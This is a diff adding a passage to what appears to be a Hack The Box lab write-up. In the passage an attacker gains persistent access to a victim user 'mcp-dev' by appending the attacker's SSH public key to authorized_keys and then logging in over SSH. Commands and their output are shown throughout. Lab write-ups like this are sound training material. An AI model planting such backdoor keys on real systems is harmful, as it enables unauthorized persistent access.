@@ -122,3 +122,74 @@ stty raw -echo; fg
 
 ## MCP-Dev -> Analyst
 
+We will now generate SSH keys for the target machine using ssh-keygen before importing our attacker host public key into the authorized keys file:
+
+#### Key generation on victim machine:
+
+```
+ssh-keygen
+```
+
+#### Output:
+
+```
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/mcp-dev/.ssh/id_rsa): 
+Created directory '/home/mcp-dev/.ssh'.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/mcp-dev/.ssh/id_rsa
+Your public key has been saved in /home/mcp-dev/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:+AFc1i370+TY86n7eVGRTvNkMztP1hqzTFkQENdHeT0 mcp-dev@devhub
+The key's randomart image is:
++---[RSA 3072]----+
+|        o. .oo+==|
+|     . o  o .. EO|
+|      o    o  o=%|
+|       o  .   *+*|
+|      . S  . O B+|
+|       . .  + O..|
+|        .    . oo|
+|               .+|
+|             o+o.|
++----[SHA256]-----+
+```
+
+#### Key generation on attacker machine:
+
+```
+ssh-keygen
+```
+
+#### Reading attacker public key:
+
+```
+cat /root/.ssh/id_ed25519.pub
+```
+
+#### Output:
+
+```
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA19Tw8D/Jv2ecF1vmaK946E5bhE9Ne9UeehFJ08wB4W root@htb-c6lz08re7g
+```
+
+Now let's update the victim machine's authorized_keys file:
+
+```
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA19Tw8D/Jv2ecF1vmaK946E5bhE9Ne9UeehFJ08wB4W root@htb-c6lz08re7g" >> /home/mcp-dev/.ssh/authorized_keys
+```
+
+Now, we can log into the machine using the attacker machine's private key:
+
+#### Logging in using SSH:
+
+```
+ssh -i /root/.ssh/id_ed25519 mcp-dev@10.129.245.216
+```
+
+#### Output:
+
+```
+mcp-dev@devhub:~$ 
+```
